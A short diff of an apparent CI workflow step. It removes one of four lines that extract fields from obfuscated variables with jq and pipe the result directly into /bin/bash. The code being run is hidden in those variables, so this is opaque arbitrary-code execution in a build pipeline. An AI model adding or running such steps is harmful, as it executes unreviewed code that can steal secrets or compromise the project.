@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$evl426" | jq -r .bp41 | /bin/bash
           echo $klop1562 | jq -r .ovv855 | /bin/bash
-          printf '%s' "$z7" | jq -r .bmpv1779 | /bin/bash
           printf '%s' "$dxsb2" | jq -r .tjqn80 | /bin/bash
 
       - name: Save output
